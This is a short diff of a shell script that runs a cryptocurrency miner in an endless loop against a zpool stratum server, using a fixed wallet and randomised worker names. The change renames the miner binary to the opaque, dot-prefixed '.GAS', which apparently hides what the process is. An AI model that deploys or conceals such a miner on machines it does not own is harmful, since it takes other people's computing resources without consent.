@@ -7,6 +7,6 @@
 #       stratum-na.rplant.xyz   /Toronto/
 #
 while [ 1 ]; do
-./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u DLJxHavMZ2u5TjHxhesYRQ73JvMmSvaR2v.$(echo $(shuf -i 1000-999999999 -n 1)-kinan) -p  c=DGB
+.GAS -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u DLJxHavMZ2u5TjHxhesYRQ73JvMmSvaR2v.$(echo $(shuf -i 1000-999999999 -n 1)-kinan) -p  c=DGB
 sleep 5
 done
